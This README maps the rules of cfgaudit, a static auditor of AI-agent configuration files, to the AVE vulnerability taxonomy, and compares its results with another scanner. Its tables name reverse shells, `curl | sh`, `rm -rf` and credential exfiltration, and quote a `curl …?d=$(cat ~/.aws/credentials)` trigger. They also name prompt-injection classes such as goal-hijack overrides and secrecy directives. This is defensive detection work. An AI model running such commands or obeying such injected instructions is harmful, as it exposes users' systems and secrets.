# cfgaudit → AVE crosswalk

[cfgaudit](https://github.com/cfgaudit/cfgaudit) is a static auditor of committable AI-agent **configuration files** (Claude Code `settings.json` / `CLAUDE.md` / `.mcp.json` / hooks / plugins, and the cross-agent equivalents: Cursor, Copilot, Gemini, Codex, Devin, Zed, Continue). It does not connect to running servers or observe runtime, so it maps only to AVE's `static_detection` records.

cfgaudit emits each rule's primary AVE id in its JSON and SARIF output (`AVEID` in JSON; `properties.ave_id` in SARIF). This crosswalk is the source of truth that mapping is kept in sync with. Full write-up: [`docs/cfgaudit-to-ave.md`](https://github.com/cfgaudit/cfgaudit/blob/main/docs/cfgaudit-to-ave.md).

## Versions

| | Version |
|---|---|
| cfgaudit | 1.11.0 |
| AVE record set | 1.1.0 (70 records) |
| Bawbel Scanner (validation, below) | 1.3.0 |

## Coverage

cfgaudit has **97 rules** in total. **53 of them map onto 23 AVE behavioral classes**, up from 35 onto 19 at v1.10.0. It is a many-to-one mapping: several cfgaudit rules land on the same AVE class, because cfgaudit slices threats by config surface where AVE slices by behavior. For example, cfgaudit has five distinct secret-detection rules (a secret in `settings.json` env, in an MCP `env`/`headers` block, an entropy fallback, a Continue inline `apiKey`, a crypto signing key), and all five map to the single AVE class `AVE-2026-00047` (hardcoded credentials in component).

The other 44 rules have no AVE class: they check config surfaces AVE's skill and MCP-server records do not enumerate (see "Config surfaces beyond AVE's model" below).

**Most of that growth is not new cfgaudit rules.** Five rules were added in v1.11.0 and three of them map. The other fifteen new mappings are rules that existed all along and finally have a home, in `AVE-2026-00061` through `AVE-2026-00064`, the four config classes AVE added from this crosswalk's own gap list ([#68](https://github.com/aveproject/ave/issues/68)). Four of the eight surfaces listed below at v1.10.0 are therefore now closed.

**One mapping moved.** `CFG091` (qwen `tools.approvalMode: "yolo"`) was mapped to `AVE-2026-00021`, whose text describes *"a component that explicitly **instructs** the agent to bypass this confirmation step"*. It is a setting, not an instruction, and `AVE-2026-00063` is explicit that it covers the declarative case *"independent of any instruction text"*. `AVE-2026-00021` keeps the instruction-driven rule (`CFG029`).

## Rule mapping

| cfgaudit rule(s) | AVE id | Class | Notes |
|---|---|---|---|
| CFG024 | AVE-2026-00029 | homoglyph / Unicode obfuscation | hidden Unicode control chars in instruction text |
| CFG026 | AVE-2026-00007 | goal hijack | override / persona / authority instruction |
| CFG092 | AVE-2026-00007 | goal hijack | Kimi agent file `override: true` replaces the whole system prompt |
| CFG029 | AVE-2026-00021 | autonomous action without confirmation | instruction to bypass permission prompts |
| CFG030 | AVE-2026-00010 | covert instruction concealment | "don't tell the user" / secrecy directive |
| CFG032 | AVE-2026-00025 | conversation-history / role injection | pseudo-system tags, turn-boundary injection |
| CFG035 | AVE-2026-00011 | dynamic tool-call injection | instruction to configure or trust an MCP server |
| CFG031, CFG036, CFG037, CFG038 | AVE-2026-00003 | credential exfiltration | sensitive-path read, env dump, embedded exfil shell |
| CFG033, CFG072 | AVE-2026-00039 | covert-channel exfiltration | markdown-image sink, DNS-name exfil |
| CFG056 | AVE-2026-00058 | deceptive trigger / activation-scope | broad always-on skill trigger |
| CFG057 | AVE-2026-00057 | obfuscated / encoded payload | base64 or data-URI encoded injection |
| CFG081 | AVE-2026-00027 | multi-turn instruction persistence | "survive context compaction" directive |
| CFG051, CFG085 | AVE-2026-00048 | unsafe agent delegation chain | over-broad tool grant in agent frontmatter |
| CFG090 | AVE-2026-00032 | network reconnaissance instruction | scan or enumerate an internal network (see gaps re: precision) |
| CFG008, CFG014 | AVE-2026-00004 | shell-pipe code execution | reverse shell, `curl \| sh` |
| CFG039 | AVE-2026-00005 | recursive filesystem destruction | `rm -rf` |
| CFG027, CFG028 | AVE-2026-00008 | persistence / self-replication | cron/startup persistence, writing trust files |
| CFG007, CFG050, CFG054, CFG065, CFG073, CFG097 | AVE-2026-00047 | hardcoded credentials in component | secrets in settings or MCP env/headers; CFG097 adds a literal in a Gemini remote agent's `auth` block |
| CFG052, CFG059 | AVE-2026-00017 | server impersonation / spoofing | MCP name shadowing, typosquat |
| CFG019, CFG020, CFG070 | AVE-2026-00055 | command exec via untrusted MCP launch config | inline-script, env-code, repo-relative launcher |
| CFG075 | AVE-2026-00061 | TLS verification disabled in config | `NODE_TLS_REJECT_UNAUTHORIZED=0`, `GIT_SSL_NO_VERIFY`, `--insecure` in MCP `env`/`args` |
| CFG010, CFG055, CFG074, CFG089 | AVE-2026-00062 | unpinned dependency / supply-chain substitution | unpinned `@latest`/`:latest`, `skills-lock.json` with no integrity pin, marketplace source without a full-SHA pin |
| CFG003, CFG004, CFG048, CFG053, CFG063, CFG079, CFG087, CFG091, CFG093, CFG096 | AVE-2026-00063 | approval gate bypassed by declarative config | `enableAllProjectMcpServers`, `defaultMode: bypassPermissions`, VS Code `chat.permissions.default`, blanket MCP-trust keys, Codex `approval_policy`/`approvals_reviewer`, `autoMode` classifier, a hook answering a permission gate, qwen `approvalMode: yolo`, Cursor allowlists, Gemini MCP `trust` |
| CFG047, CFG067, CFG086 | AVE-2026-00064 | zero-click project-load auto-run | `.vscode/tasks.json` `runOn: folderOpen` and Zed `create_worktree` hook tasks, committed project hooks, zero-click hook events |

Mappings are class-level behavioral equivalence, not asserted identity. Where a cfgaudit rule covers more than one AVE class, only the canonical primary is emitted (matching AVE's one-`ruleId`-per-class SARIF model); the full multi-mapping is in cfgaudit's own crosswalk doc.

## Config surfaces beyond AVE's model

AVE's records enumerate behavior in skills and MCP servers. cfgaudit additionally audits config-file classes that carry no corresponding AVE behavioral class today.

Four of the eight surfaces listed here at v1.10.0 have since been closed by AVE records: permission/approval config and the committed-hook auto-approve case by `AVE-2026-00063`, zero-click auto-run by `AVE-2026-00064`, TLS verification disabled by `AVE-2026-00061`, and supply-chain pinning by `AVE-2026-00062`. What remains:

| Config surface | Example files / keys | Example rules |
|---|---|---|
| Telemetry / endpoint redirect | `OTEL_EXPORTER_OTLP_*ENDPOINT` to a non-local collector, `ANTHROPIC_BASE_URL` off Anthropic, model or provider `base_url` over cleartext | CFG005, CFG046, CFG071 |
| Sandbox weakening in config | `sandbox.excludedCommands` wildcard/shell, `bwrapPath`/`socatPath`, `allowUnixSockets` naming `docker.sock`; Gemini `tools.sandboxAllowedPaths` exposing `/`; Codex `danger-full-access` and `[sandbox_workspace_write] network_access`; Cursor `type: insecure_none` | CFG022, CFG061, CFG064, CFG079, CFG095 |
| Container / daemon posture | `DOCKER_HOST` or `-H` at a remote `tcp://`/`ssh://` daemon; `DOCKER_CONTENT_TRUST=0`, `--disable-content-trust`, `--insecure-registry`; Chromium `--utility-cmd-prefix`, `--renderer-cmd-prefix`, `--gpu-launcher`, `--browser-subprocess-path` in MCP `args` | CFG082, CFG084, CFG083 |
| MCP network / transport posture | bind `0.0.0.0`/`[::]`; wildcard CORS origin, escalating when auth is disabled in the same `env`; `type: sse`; `HTTP_PROXY`/`HTTPS_PROXY`/`ALL_PROXY` off loopback; HTTP transport without log redaction | CFG018, CFG066, CFG058, CFG021, CFG069 |
| Cleartext endpoint, distinct from TLS verification disabled | a committed `http://` MCP server URL, model base URL, or A2A `agent_card_url` | CFG049, CFG071, CFG097 |
| Natural-language steering of an approval classifier | Cursor `.cursor/permissions.json` `autoRun.allow_instructions` | CFG094 |

The last two are new in this revision.

**Container posture and MCP network posture are each several mechanisms, not one class.** Container posture is three with no shared detection logic: the daemon redirect, image-trust verification being off, and a launcher flag replacing the browser subprocess. MCP network posture is five. If either becomes a record, the daemon redirect and the bind-all case are the highest-value single ones. This was the specific question in [#68](https://github.com/aveproject/ave/issues/68), answered there at field level.

These are not gaps in this crosswalk; they are config classes outside AVE's current skill/MCP-behavioral scope. They are listed here so the taxonomy's coverage against a config-auditor is visible.

## Cross-implementation validation (cfgaudit vs Bawbel Scanner)

To test whether the shared ids actually interoperate, cfgaudit **1.9.0** and [Bawbel Scanner](https://github.com/bawbel/scanner) **1.3.0**, which share no code and no ruleset and only the AVE taxonomy, were run on the same `SKILL.md` files using cfgaudit's canonical trigger text unmodified (not tuned for agreement). Static engines only (`pattern`+`yara`+`semgrep`, no LLM), both reading `ave_id` from JSON.

Of cfgaudit's 33 AVE-mapped rules, **10 instruction/skill-content rules share a scan surface with Bawbel's file scan** (the other 23 read command sites or config files Bawbel's file scan does not cover). Of those 10:

**Both scanners independently emit the same `ave_id` on 5 of the 10.**

| Rule | AVE | cfgaudit | Bawbel | |
|---|---|---|---|---|
| CFG024 | 00029 | yes | yes | agree |
| CFG026 | 00007 | yes | yes (+00002) | agree |
| CFG029 | 00021 | yes | yes | agree |
| CFG030 | 00010 | yes | yes (+00003) | agree |
| CFG090 | 00032 | yes | yes | agree |
| CFG031 | 00003 | yes | no | detection differs |
| CFG035 | 00011 | yes | no | detection differs |
| CFG036 | 00003 | yes | no | detection differs |
| CFG057 | 00057 | yes | no | detection differs |
| CFG081 | 00027 | yes | no | detection differs |

The 5 agreements are cross-implementation corroboration of the mapping. The 5 divergences are detection-pattern differences, not mapping errors: Bawbel bundles a rule for each class, but its pattern did not match cfgaudit's canonical trigger. For CFG036, for instance, Bawbel reports the `curl …?d=$(cat ~/.aws/credentials)` skill CLEAN while cfgaudit flags it. A shared id makes exactly these coverage differences visible and comparable, which is the point.

## Gaps

Static `static_detection` classes cfgaudit does not map, with the reason:

| AVE id | Gap |
|---|---|
| AVE-2026-00015 | system-prompt extraction. Maps to OWASP LLM07, which cfgaudit treats as runtime; the instruction is static, but the scope boundary is undecided. |
| AVE-2026-00036 | lateral movement. cfgaudit implemented and then reverted this rule after a false-positive analysis over 422 real instruction files: the vocabulary (`lateral movement`, `pivot to other systems`) is statically indistinguishable from security-tool self-description and defensive contexts. The reverted rule used the CFG091 id, which cfgaudit has since reused for the qwen approval-mode rule (mapped to AVE-2026-00021). |
| AVE-2026-00059 | fragmented cross-description injection. Needs multi-source correlation; cfgaudit checks each file in isolation, which is the exact property this attack defeats. |
| AVE-2026-00060 | STDIO transport shell injection. A server-side implementation flaw: it needs SAST of the MCP server's source, not a read of its launch configuration. Same layer as AVE-2026-00052 and AVE-2026-00053. |
| AVE-2026-00065 | A2A agent card poisoning. cfgaudit reaches the committed pointer but not the card. A `.gemini/agents/*.md` may carry an inline `agent_card_json`, which cfgaudit recognises well enough to classify the file as a remote agent, but it does not audit the card's contents. It does flag a cleartext `agent_card_url` and a credential literal in the same file's `auth` block (CFG097). |
| AVE-2026-00069 | Image-hidden instructions in a skill package. Needs binary content analysis of a bundled image; cfgaudit reads text configuration only. Same layer as AVE-2026-00024. |
